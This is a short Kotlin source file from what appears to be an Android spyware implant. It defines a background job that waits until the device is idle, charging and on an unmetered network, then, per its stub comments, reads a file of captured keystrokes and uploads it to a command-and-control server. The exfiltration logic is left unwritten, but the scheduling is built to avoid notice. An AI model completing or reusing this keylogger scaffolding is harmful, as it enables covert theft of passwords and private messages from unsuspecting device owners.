package com.cooperthecoder.implant

import com.evernote.android.job.Job
import com.evernote.android.job.JobRequest

class UploadKeystrokesJob: Job() {

    companion object {
        const val TAG = "upload_keystrokes"

        fun schedule(): Unit {
            // Do this plugged in on an unmetered network when the device is idle.
            JobRequest.Builder(TAG)
                    .setRequiredNetworkType(JobRequest.NetworkType.UNMETERED)
                    .setRequiresDeviceIdle(true)
                    .setRequiresCharging(true)
                    .build()
                    .schedule()
        }
    }
    override fun onRunJob(params: Params): Result {
        // Read keystroke file from disk
        // Upload keystrokes to C&C
        return Result.SUCCESS
    }

}